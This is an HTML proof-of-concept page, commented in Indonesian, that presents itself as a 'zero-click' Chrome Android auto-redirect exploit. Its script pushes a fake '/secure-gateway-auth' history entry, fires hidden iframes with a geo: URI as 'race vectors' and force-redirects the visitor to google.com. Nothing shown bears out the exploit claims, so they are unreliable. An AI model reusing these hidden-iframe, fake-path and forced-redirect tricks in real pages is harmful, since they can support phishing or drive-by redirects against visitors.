<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced PoC - Chrome Android Auto-Redirect</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000000; /* Black Portal background */
            color: #00ff66;
            font-family: monospace;
            overflow: hidden;
        }
        /* Blackout Portal / Blank Portal Layer untuk mengunci render viewport */
        #blackout-portal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: #000000;
            z-index: 999999;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            transition: opacity 0.4s ease-in-out;
        }
        .console {
            border: 1px solid #00ff66;
            padding: 24px;
            border-radius: 6px;
            max-width: 500px;
            width: 85%;
            background: #050505;
            box-shadow: 0 0 20px rgba(0, 255, 102, 0.2);
        }
        h3 {
            margin-top: 0;
            color: #ff3366;
            border-bottom: 1px solid #00ff66;
            padding-bottom: 8px;
            font-size: 16px;
        }
        .log-line {
            font-size: 12px;
            margin: 6px 0;
            line-height: 1.4;
        }
        .highlight { color: #38bdf8; }
    </style>
</head>
<body>

    <!-- Blackout Portal Layer (Menutupi DOM asli untuk memaksimalkan manipulasi render) -->
    <div id="blackout-portal">
        <div class="console">
            <h3>[!] Chrome Android Auto-Redirect Engine</h3>
            <div id="status-container">
                <div class="log-line">> Menginisialisasi auto-redirect buffer...</div>
            </div>
        </div>
    </div>

    <script>
        const statusContainer = document.getElementById('status-container');

        function addLog(text) {
            const div = document.createElement('div');
            div.className = 'log-line';
            div.innerHTML = `> ${text}`;
            statusContainer.appendChild(div);
        }

        // Eksekusi Zero-Click Instan khusus Chrome Android
        try {
            // 1. Injeksi History State untuk mengontrol alur riwayat browser
            history.pushState({auto: true}, "", "/secure-gateway-auth");
            addLog("History state disuntikkan: <span class='highlight'>/secure-gateway-auth</span>");

            // 2. Navigation Race Condition khusus perangkat seluler (Chrome Android)
            const raceVectors = [
                "geo:0,0?q=auto_redirect",
                "about:blank"
            ];

            raceVectors.forEach((uri, index) => {
                setTimeout(() => {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = uri;
                    document.body.appendChild(iframe);
                    addLog(`Race vector [${index + 1}] dilepaskan.`);
                }, index * 25); // Interval rapat untuk memicu kondisi asinkron di Chrome mobile
            });

            // 3. Auto-Redirect tanpa ditekan ke Google.com
            // Menggunakan window.location.replace agar proses pengalihan berjalan otomatis seketika
            setTimeout(() => {
                addLog("Memicu redirect otomatis ke Google.com...");
                window.location.replace("https://www.google.com");
            }, 500); // Eksekusi otomatis dalam 500ms setelah halaman dimuat

        } catch (err) {
            addLog(`Kesalahan Eksekusi: ${err.message}`);
            // Fallback langsung jika terjadi blokir
            window.location.href = "https://www.google.com";
        }
    </script>
</body>
</html>
